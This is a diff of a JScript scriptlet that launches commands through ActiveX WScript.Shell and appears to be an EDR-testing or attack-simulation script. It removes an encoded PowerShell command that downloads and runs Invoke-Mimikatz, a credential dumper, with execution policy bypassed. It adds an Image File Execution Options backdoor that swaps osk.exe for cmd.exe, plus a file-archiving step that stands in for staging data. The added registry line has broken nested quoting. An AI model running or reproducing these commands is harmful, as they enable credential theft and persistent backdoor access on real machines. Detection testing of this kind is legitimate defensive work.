@@ -21,8 +21,9 @@
 	function Exec()
 	{
 		var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
-		var r = new ActiveXObject("WScript.Shell").Run("powershell.exe -ExecutionPolicy Bypass -encodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AYwBsAHkAbQBiADMAcgAvAFAAbwB3AGUAcgBTAGgAZQBsAGwALwBtAGEAcwB0AGUAcgAvAEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6AC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAnACkAOwAgAEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6AA==");
-	}
+		var r = new ActiveXObject("WScript.Shell").Run("REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"");
+		var r = new ActiveXObject("WScript.Shell").Run("powershell Compress-Archive -Path c:\edrtest\*.txt -Destination c:\edrtest\edrtest.zip");
+}
 
 ]]>
 </script>
